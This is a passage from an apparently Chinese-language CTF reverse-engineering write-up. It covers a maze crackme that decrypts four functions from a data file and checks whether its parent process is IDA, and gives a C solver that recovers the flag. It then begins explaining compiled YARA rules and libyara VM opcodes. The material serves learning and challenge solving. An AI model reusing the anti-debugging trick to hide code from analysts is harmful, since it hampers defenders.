class="line">49  49  49  49  49  49  49  49  49  49  49   0</span><br></pre></td></tr></table></figure>

<p>sddssddwwddsdssaassaaaassddssdddwwddwddsss，程序验证通过，但是不是flag。发现ipu文件还没有使用，而且第一个输入也没被使用。</p>
<p>关注迷宫的第一个输入，注意到这里是有一个指针指向第一次输入的，看这个指针的交叉引用，可以看到一个验证和分发程序。</p>
<p>sub_1D80</p>
<p>首先，读入了1pmoluy.ipu文件，经过文件名解码，文件读入与解码。然后得到 4 个指针，分别指向不同解密后函数的入口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)dword_420FB0 = Buffer;</span><br><span class="line">qmemcpy(v16, &quot;FUNC&quot;, sizeof(v16));</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 4) = *(_DWORD *)dword_420FB0 + sub_401AC0(*(_DWORD *)dword_420FB0, v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 8) = *(_DWORD *)(dword_420FB0 + 4) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 4), v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 12) = *(_DWORD *)(dword_420FB0 + 8) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 8), v16, v13);</span><br></pre></td></tr></table></figure>

<p>对比父进程名字的前 3 个字节。如果不匹配，<code>byte_420100[6] = 10;</code> → 改变全局控制流。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String2 = &#123; -26, -21, -18, -113 &#125;;</span><br><span class="line">for (m=0; m&lt;4; m++) String2[m] ^= 0x8F;</span><br><span class="line">_strnicmp(String1, String2, 3)</span><br></pre></td></tr></table></figure>

<p>strings2单字节异或得到字符串”ida”，如果父进程是 IDA，则会把 <code>byte_420100[6]</code> 设为 10。</p>
<p>sub_2790，异常处理函数，这里又改成了1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_402790@&lt;eax&gt;(int a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(_DWORD *)(a1 + 0x10) == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++**(_DWORD **)(a1 + 8);</span><br><span class="line">    byte_420100[6] = 1;</span><br><span class="line">    *(_DWORD *)(a1 - 28) = sub_401370;</span><br><span class="line">    dword_420FC0 = *(_DWORD *)(a1 - 28);</span><br><span class="line">    __asm &#123; retn &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(a1 - 36) = 0;</span><br><span class="line">  *(_DWORD *)(a1 - 4) = -2;</span><br><span class="line">  return *(_DWORD *)(a1 - 36);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在反调试的函数中，调用了1pmoluy.ipu文件。文件中存储的是四个加密函数，经过解密后会被后面分发函数进行调用。然后根据路径进行顺序解密。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_401370@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_420FB8 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="type">char</span> *))dword_420FB0)(off_420234);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( dword_420FB8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        (*(<span class="keyword">void</span> (__cdecl **)(<span class="type">char</span> *))(dword_420FB0 + <span class="number">4</span>))(off_420234);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        (*(<span class="keyword">void</span> (__cdecl **)(<span class="type">char</span> *))(dword_420FB0 + <span class="number">8</span>))(off_420234);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        (*(<span class="keyword">void</span> (__cdecl **)(<span class="type">char</span> *))(dword_420FB0 + <span class="number">12</span>))(off_420234);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> dword_420FB8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401210();</span><br><span class="line">  <span class="keyword">return</span> dword_420FB8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密1 异或 左循环位移 异或 右循环位移</p>
<p>加密2 固定key生成固定box和对应固定key 这里dump其实就行</p>
<p>加密3 这里把boxdump下来试两下就会发现 这里仅仅是实现了加减法</p>
<p>加密4 根据key生成随机顺序换序 也可以dump下来然后固定换回来就行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Flaglen 42</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt01</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* qinput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> enobj = qinput[i];</span><br><span class="line">        enobj ^= i;</span><br><span class="line">        enobj = ~((enobj &gt;&gt; (i &amp; <span class="number">7</span>) | (enobj &lt;&lt; (<span class="number">8</span> - (i &amp; <span class="number">7</span>)))));</span><br><span class="line">        enobj ^= i;</span><br><span class="line">        enobj = (enobj &lt;&lt; (i &amp; <span class="number">7</span>) | (enobj &gt;&gt; (<span class="number">8</span> - (i &amp; <span class="number">7</span>))));</span><br><span class="line">        qinput[i] = enobj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt02</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* qinput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key2[] = &#123; <span class="number">0xbd</span>, <span class="number">0xbf</span>, <span class="number">0xbd</span>, <span class="number">0xba</span>, <span class="number">0xc1</span>, <span class="number">0xbe</span>, <span class="number">0xec</span>, <span class="number">0xfb</span>, <span class="number">0xe9</span>, <span class="number">0x8f</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a = <span class="number">0x8f</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(key2); i++)</span><br><span class="line">        key2[i] = ((key2[i] &amp; ~a) | (~key2[i] &amp; a));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> enobj = qinput[i];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> box[<span class="number">9</span>][<span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> cn = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">-1</span>; x &lt;= <span class="number">1</span>; x++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">-1</span>; y &lt;= <span class="number">1</span>; y++)</span><br><span class="line">            &#123;</span><br><span class="line">                box[cn][<span class="number">0</span>] = (key2[i % <span class="number">10</span>] + x * <span class="number">16</span> + y) &amp; <span class="number">0xff</span>;</span><br><span class="line">                box[cn][<span class="number">1</span>] = (box[cn][<span class="number">0</span>] % <span class="number">3</span>) &amp; <span class="number">1</span>;</span><br><span class="line">                box[cn][<span class="number">2</span>] = (box[cn][<span class="number">0</span>] % <span class="number">5</span>) &amp; <span class="number">1</span>;</span><br><span class="line">                cn++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> num1 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> num2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> lastnum1 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> lastnum2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            num1 |= (box[j][<span class="number">1</span>] &lt;&lt; (<span class="number">7</span> - j));</span><br><span class="line">        &#125;</span><br><span class="line">        lastnum1 = box[j][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (lastnum1)</span><br><span class="line">            enobj += num1;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            enobj += ~num1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            num2 |= (box[j][<span class="number">2</span>] &lt;&lt; (<span class="number">7</span> - j));</span><br><span class="line">        &#125;</span><br><span class="line">        lastnum2 = box[j][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> (lastnum2)</span><br><span class="line">            enobj -= ~num2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            enobj -= num2;</span><br><span class="line">        qinput[i] = enobj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt03</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* qinput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> enobj = qinput[i];</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> obj01 = (enobj &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> obj02 = enobj &amp; <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line">        obj01 -= (i &amp; <span class="number">0xf</span>);</span><br><span class="line">        obj02 += (i &amp; <span class="number">0xf</span>);</span><br><span class="line"></span><br><span class="line">        enobj = (obj01 &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">        enobj |= (obj02 &amp; <span class="number">0xf</span>);</span><br><span class="line"></span><br><span class="line">        qinput[i] = enobj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> card[] = <span class="string">&quot;A234567890JQK&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title">makenum</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> cn = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> randnum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* num = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">42</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* num1 = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">42</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* num2 = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num[i] = i;</span><br><span class="line">        num2[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        randnum = (randnum + (card[i % <span class="number">13</span>] + i)) % <span class="number">42</span>;</span><br><span class="line">        <span class="keyword">if</span> (num2[randnum] == <span class="number">0</span>) &#123;</span><br><span class="line">            num1[cn] = num[randnum];</span><br><span class="line">            num2[randnum] = <span class="number">1</span>;</span><br><span class="line">            cn++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cn == <span class="number">42</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(num2);</span><br><span class="line">    <span class="built_in">free</span>(num);</span><br><span class="line">    <span class="keyword">return</span> num1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt04</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* enobj = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* num = <span class="built_in">makenum</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">        enobj[num[i]] = flag[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">        flag[i] = enobj[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">wasd2real</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wrong move&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">42</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[] = &#123;</span><br><span class="line">        <span class="number">0xBA</span>, <span class="number">0x46</span>, <span class="number">0x11</span>, <span class="number">0x54</span>, <span class="number">0x95</span>, <span class="number">0xFC</span>, <span class="number">0x44</span>, <span class="number">0x07</span>, <span class="number">0x93</span>, <span class="number">0x15</span>, <span class="number">0x67</span>, <span class="number">0xBE</span>, <span class="number">0x11</span>, <span class="number">0x67</span>, <span class="number">0xF5</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0xEA</span>, <span class="number">0x43</span>, <span class="number">0xA3</span>, <span class="number">0x1F</span>, <span class="number">0xA9</span>, <span class="number">0xEB</span>, <span class="number">0xF0</span>, <span class="number">0x27</span>, <span class="number">0xCE</span>, <span class="number">0x34</span>, <span class="number">0x3A</span>, <span class="number">0xA5</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xFC</span>, <span class="number">0x41</span>, <span class="number">0x8E</span>, <span class="number">0x86</span>, <span class="number">0xD2</span>, <span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x2F</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> wasd[] = <span class="string">&quot;sddssddwwddsdssaassaaaassddssdddwwddwddsss&quot;</span>;</span><br><span class="line">    <span class="comment">//sddwddsdssdssaawawaaassdsdssaasssddddd</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="built_in">wasd2real</span>(wasd[i - <span class="number">1</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">decrypt01</span>(flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">decrypt02</span>(flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">decrypt03</span>(flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">decrypt04</span>(flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="YA"><a href="#YA" class="headerlink" title="YA"></a>YA</h3><p>前置知识：</p>
<ol>
<li>YARA 的 <code>.yar</code> 规则文件在用 <code>yarac</code> 编译后，会变成 <code>.yac</code> 二进制文件。</li>
<li>libyara <a target="_blank" rel="noopener" href="https://github.com/VirusTotal/yara">GitHub - VirusTotal&#x2F;yara: The pattern matching swiss knife</a></li>
</ol>
<p><strong>libyara</strong> 就是 <strong>YARA 的核心库</strong>，它实现了：</p>
<ul>
<li>YARA 规则的解析、编译（把 <code>.yar</code> → <code>.yac</code>）。</li>
<li>YARA 虚拟机（VM）的执行（解释 <code>.yac</code> 里的字节码）。</li>
<li>对目标文件、内存、进程等进行匹配。</li>
</ul>
<p>换句话说，命令行工具 <code>yara</code> 和 <code>yarac</code> 只是壳，真正的功能全在 <strong>libyara</strong> 里。</p>
<p>在 <code>libyara</code> 源码里，有个核心文件 <strong><code>exec.h</code></strong>（libyara\include\yara），定义了 YARA VM 的指令集，比如：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> OP_ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_HALT  255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_NOP   254</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_AND                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_OR                         2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_NOT                        3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_BITWISE_NOT                4</span></span><br></pre></td></tr></table></figure>

<p><strong><code>exec.c</code></strong> 里写了 VM 的解释循环，大概长这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> OP_NOP:</span><br><span class="line">      YR_DEBUG_FPRINTF(<span class="number">2</span>, stderr, <span class="string">&quot;- case OP_NOP: // %s()\n&quot;</span>, __FUNCTION__);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> OP_HALT:</span><br><span class="line">      YR_DEBUG_FPRINTF(<span class="number">2</span>, stderr, <span class="string">&quot;- case OP_HALT: // %s()\n&quot;</span>, __FUNCTION__);</span><br><span class="line">      <span class="keyword">assert</span>(stack.sp == <span class="number">0</span>);  <span class="comment">// When HALT is reached the stack should be empty.</span></span><br><span class="line">      stop = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      ....</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在 CTF 题目里，你通常只拿到一个 <code>.yac</code> 文件，没有对应的 <code>.yar</code> 源规则。 但是要分析规则逻辑（尤其是 <strong>flag 验证逻辑</strong>），你必须知道它在做什么运算。</p>
<p>题解：<a target="_blank" rel="noopener" href="https://astralprisma.github.io/2025/07/28/jq_25_final/">https://astralprisma.github.io/2025/07/28/jq_25_final/</a></p>
<p>yara源码：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">rule A</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description <span class="operator">=</span> &quot;solve this&quot;</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $a <span class="operator">=</span> &quot;?????&quot; nocase wide ascii</span><br><span class="line"></span><br><span class="line">    <span class="keyword">condition</span>:</span><br><span class="line">        $a <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">+</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">-</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span 